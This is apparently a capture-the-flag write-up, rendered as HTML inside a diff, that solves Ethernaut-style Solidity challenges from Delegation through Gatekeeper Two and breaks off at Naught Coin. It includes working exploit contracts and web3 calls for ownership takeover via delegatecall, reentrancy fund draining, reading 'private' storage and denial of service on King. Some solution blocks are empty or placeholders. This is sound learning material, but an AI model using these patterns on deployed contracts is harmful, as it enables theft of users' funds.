+  <span class="n">Delegate</span> <span class="n">delegate</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_delegateAddress</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">delegate</span> <span class="o">=</span> <span class="n">Delegate</span><span class="p">(</span><span class="n">_delegateAddress</span><span class="p">);</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+	<span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">delegate</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+	  <span class="nb">this</span><span class="p">;</span>
+	<span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve the challange you need to become owner of the contract .</p>
+
+<p>We have Deligation contract which uses Delegate contract .</p>
+
+<p>First we see what is deligate call.</p>
+
+<p><code class="language-plaintext highlighter-rouge">In simple if there are 2 contracts A and B , A deligatecalls B contract , we are executing the code of contract B with the storage of A</code></p>
+
+<p>So we have a fallback function here which takes msg.data as input.</p>
+
+<p>As you can see there’s a function called pwn in Deligate contract which sets the owner variable.</p>
+
+<p>So if we call that function by using Deligatecall we can modify the owner variable in the Deligation contract.</p>
+
+<p>To call the function we can send the first 4 bytes of keccak hash of the function name in the data field which calls the function.</p>
+
+<p>First calculate the hash of the pwn() function</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="dl">"</span><span class="s2">pwn()</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Then send transaction to the Deligation contract with data field set to that hash.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">sendTransaction</span><span class="p">({</span> <span class="na">from</span><span class="p">:</span> <span class="nx">player</span><span class="p">,</span> <span class="na">to</span><span class="p">:</span> <span class="nx">instance</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0xdd365b8b</span><span class="dl">"</span> <span class="p">});</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="7-force">7 Force</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Force</span> <span class="p">{</span><span class="cm">/*
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+*/</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>We have given a empty contract , the goal of this challenge is to make balance greater than 0 of this contract.</p>
+
+<p>To send balance to the contract there is no payable function in this contract .</p>
+
+<p>In solidity there’s a special function that sends balance forcefully ,that is selfdestruct().</p>
+
+<p>selfdestruct () is used to erase the contract .</p>
+
+<p>When the contract calls selfdestruct() function with an address parameter , the balance of the contract will transfer to the address .</p>
+
+<p>So we can simply create a new contract and send some balance to the contract and then call selfdestruct (challange contract address) .</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Force</span> <span class="p">{</span>
+    <span class="k">function</span> <span class="n">receiveEther</span><span class="p">()</span> <span class="k">payable</span> <span class="k">public</span><span class="p">{</span>
+     <span class="p">}</span>
+    <span class="k">function</span> <span class="nb">send</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_add</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="nb">selfdestruct</span><span class="p">(</span><span class="n">_add</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="8-vault">8 Vault</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Vault</span> <span class="p">{</span>
+  <span class="kt">bool</span> <span class="k">public</span> <span class="n">locked</span><span class="p">;</span>
+  <span class="kt">bytes32</span> <span class="k">private</span> <span class="n">password</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_password</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">locked</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">_password</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">unlock</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_password</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">password</span> <span class="o">==</span> <span class="n">_password</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">locked</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to call the unlock with correct password.</p>
+
+<p>As you can see the password is stored in the contract itself with visibility private.</p>
+
+<p>In blockchain everything is public , so do the password too . The private only limits it by using in other derived contracts.</p>
+
+<p>We can read the contract storage using web3js .</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h2 id="9-king">9 King</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">King</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">payable</span> <span class="n">king</span><span class="p">;</span>
+  <span class="kt">uint</span> <span class="k">public</span> <span class="n">prize</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="n">king</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="n">prize</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;=</span> <span class="n">prize</span> <span class="o">||</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
+    <span class="n">king</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+    <span class="n">king</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="n">prize</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">_king</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="k">payable</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">king</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to become the king at the end of the submission .</p>
+
+<p>There’s a fallback function that makes a user as king if the msg.value greater than or equals to the prize value .So anyone can become king but we need to stop the others.</p>
+
+<p>First we send ether more than prize and become king.</p>
+
+<p>Next we need to stop the king.transfer() function to stop others to become king after the submission.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">Kinghack</span> <span class="p">{</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_add</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="n">_add</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span><span class="mi">1000000000000001</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="mi">1</span><span class="o">==</span><span class="mi">2</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="10-re-entrancy">10 Re-entrancy</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Reentrance</span> <span class="p">{</span>
+
+  <span class="k">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
+  <span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+  <span class="k">function</span> <span class="n">donate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">].</span><span class="n">add</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_who</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="nb">balance</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_who</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">)</span> <span class="p">{</span>
+      <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,)</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span><span class="n">_amount</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+      <span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_amount</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to steal all the funds from the contract.</p>
+
+<p>In withdraw function , the contract is sending amount via call method, instead of send or transfer which introduces reentrancy bug.</p>
+
+<p>If msg.sender is a contract and calling the withdraw function , then the withdraw function makes a call to the msg.sender contract which triggers a function that calls the withdraw function again recursively .</p>
+
+<p>So first we depoist some amount in the contract and call the withdraw function from the attacker contract, the balance is updated after the call so we can steal the funds .</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">interface</span> <span class="n">Re</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="n">donate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span><span class="p">;</span>
+  <span class="k">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">Reentrance</span> <span class="p">{</span>
+    <span class="n">Re</span> <span class="n">reentrace</span><span class="p">;</span>
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_add</span><span class="p">)</span> <span class="k">payable</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">reentrace</span> <span class="o">=</span> <span class="n">Re</span><span class="p">(</span><span class="n">_add</span><span class="p">);</span>
+        <span class="n">reentrace</span><span class="p">.</span><span class="n">donate</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">startAttack</span><span class="p">()</span> <span class="k">payable</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">reentrace</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mf">0.001</span> <span class="kc">ether</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="n">reentrace</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mf">0.001</span> <span class="kc">ether</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="11-elevator">11 Elevator</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">interface</span> <span class="n">Building</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="n">isLastFloor</span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">Elevator</span> <span class="p">{</span>
+  <span class="kt">bool</span> <span class="k">public</span> <span class="n">top</span><span class="p">;</span>
+  <span class="kt">uint</span> <span class="k">public</span> <span class="n">floor</span><span class="p">;</span>
+  <span class="k">function</span> <span class="n">goTo</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_floor</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">Building</span> <span class="n">building</span> <span class="o">=</span> <span class="n">Building</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="n">building</span><span class="p">.</span><span class="n">isLastFloor</span><span class="p">(</span><span class="n">_floor</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">floor</span> <span class="o">=</span> <span class="n">_floor</span><span class="p">;</span>
+      <span class="n">top</span> <span class="o">=</span> <span class="n">building</span><span class="p">.</span><span class="n">isLastFloor</span><span class="p">(</span><span class="n">floor</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge ,we need to make the top as true.</p>
+
+<p>The contract inherting a Building contract which has a isLastFloor function (which is also the msg.sender).</p>
+
+<p>The isLastFloor function should return true in first call and false in second call so that we can make top as true.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div></div>
+
+<h2 id="12-privacy">12 Privacy</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Privacy</span> <span class="p">{</span>
+  <span class="kt">bool</span> <span class="k">public</span> <span class="n">locked</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="k">public</span> <span class="n">ID</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="n">timestamp</span><span class="p">;</span>
+  <span class="kt">uint8</span> <span class="k">private</span> <span class="n">flattening</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="kt">uint8</span> <span class="k">private</span> <span class="n">denomination</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
+  <span class="kt">uint16</span> <span class="k">private</span> <span class="n">awkwardness</span> <span class="o">=</span> <span class="kt">uint16</span><span class="p">(</span><span class="nb">now</span><span class="p">);</span>
+  <span class="kt">bytes32</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">private</span> <span class="n">data</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">_data</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">function</span> <span class="n">unlock</span><span class="p">(</span><span class="kt">bytes16</span> <span class="n">_key</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">_key</span> <span class="o">==</span> <span class="kt">bytes16</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
+    <span class="n">locked</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="cm">/*
+    A bunch of super advanced solidity algorithms...
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+  */</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge , need to call the unlock function with bytes16 <code class="language-plaintext highlighter-rouge">_key</code>.</p>
+
+<p>This is similar to the <a href="#8-vault">Vault</a> , the key is stored at the data[2].</p>
+
+<p>The data is bytes32[] array and the storage slots are 3, 4 , 5 respectively , for the data[2] it is stored in slot 5.</p>
+
+<p>But it is a bytes32 value , the key is bytes16 , so to convert bytes32 to bytes16 we remove the last 32 bytes from the bytes32 .</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span>
+	<span class="p">(</span><span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="mi">5</span><span class="p">)).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">34</span><span class="p">)</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="13-gatekeeper-one">13 Gatekeeper One</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Code</span>
+</code></pre></div></div>
+
+<p>To solve this challenge , we need to pass the all the checks in three gates.</p>
+
+<p>gateOne:</p>
+
+<ul>
+  <li>We can pass this check by calling the contract from another contract not an EOA</li>
+</ul>
+
+<p>gateTwo:</p>
+
+<ul>
+  <li>To pass this check , the gasLeft at the gateTwo should be divisible by 8191 .</li>
+  <li>We can control the gas of a function call using <code class="language-plaintext highlighter-rouge">call</code> so we can bruteforce the gas</li>
+  <li>We can also use remix debugger to check the gasleft at the specific Opcode.</li>
+</ul>
+
+<p>gateThree:
+There are 3 checks to pass this check .</p>
+
+<ul>
+  <li>The value of uint32 is equal to uint16 , it means the last 32 bytes should equal to last 16 bytes . 0x00001234 is equal to 0x1234</li>
+  <li>The value of uint32 is not equal to uint64 ,to do so we can change the 0 to something other than that 0x1111111100001234 is not equal to 0x0000000000001234.</li>
+  <li>The value of last 32 bits is equal to value of last 16 bits of the tx.origin. We can pass this check by sending the last 2 bytes of the address as the last 2 bytes.</li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">gatekeeper</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="n">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">_add</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+      <span class="kt">bytes8</span> <span class="n">key</span> <span class="o">=</span> <span class="mh">0x100000000000D120</span><span class="p">;</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8191</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="p">(</span><span class="kt">bool</span> <span class="n">x</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_add</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">gas</span><span class="o">:</span><span class="mi">25000</span><span class="o">+</span><span class="n">i</span><span class="p">}(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"enter(bytes8)"</span><span class="p">,</span> <span class="n">key</span><span class="p">));</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="14-gatekeeper-two">14 GateKeeper Two</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">GatekeeperTwo</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">entrant</span><span class="p">;</span>
+  <span class="k">modifier</span> <span class="n">gateOne</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">!=</span> <span class="n">tx</span><span class="p">.</span><span class="n">origin</span><span class="p">);</span>
+    <span class="n">_</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">modifier</span> <span class="n">gateTwo</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">uint</span> <span class="n">x</span><span class="p">;</span>
+    <span class="k">assembly</span> <span class="p">{</span> <span class="n">x</span> <span class="o">:=</span> <span class="n">extcodesize</span><span class="p">(</span><span class="n">caller</span><span class="p">())</span> <span class="p">}</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">_</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">modifier</span> <span class="n">gateThree</span><span class="p">(</span><span class="kt">bytes8</span> <span class="n">_gateKey</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="kt">bytes8</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">))))</span> <span class="o">^</span> <span class="kt">uint64</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">)</span> <span class="o">==</span> <span class="kt">uint64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">_</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">enter</span><span class="p">(</span><span class="kt">bytes8</span> <span class="n">_gateKey</span><span class="p">)</span> <span class="k">public</span> <span class="n">gateOne</span> <span class="n">gateTwo</span> <span class="n">gateThree</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">entrant</span> <span class="o">=</span> <span class="n">tx</span><span class="p">.</span><span class="n">origin</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to pass three gates .</p>
+
+<p>gateOne:</p>
+
+<ul>
+  <li>This check can be passed by sendind the transcation from a contract and not EOA</li>
+</ul>
+
+<p>gateTwo:</p>
+
+<ul>
+  <li>This checks if the msg.sender code size is 0 or not .</li>
+  <li>We can call it from constructor because at the time of calling the code size will be 0 , the runtime code not yet loaded to the address till execution of constructor .</li>
+</ul>
+
+<p>gateThree:</p>
+
+<ul>
+  <li>To pass this check we need to provide a gateKey which can obtained by doing XOR .</li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">gate2</span> <span class="p">{</span>
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_add</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">uint64</span> <span class="n">key</span> <span class="o">=</span> <span class="kt">uint64</span><span class="p">(</span><span class="kt">bytes8</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="nb">this</span><span class="p">)))</span> <span class="o">^</span> <span class="mh">0xffffffffffffffff</span><span class="p">);</span>
+        <span class="n">_add</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"enter(bytes8)"</span><span class="p">,</span> <span class="kt">bytes8</span><span class="p">(</span><span class="n">key</span><span class="p">)));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="15-naught-coin">15 Naught Coin</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
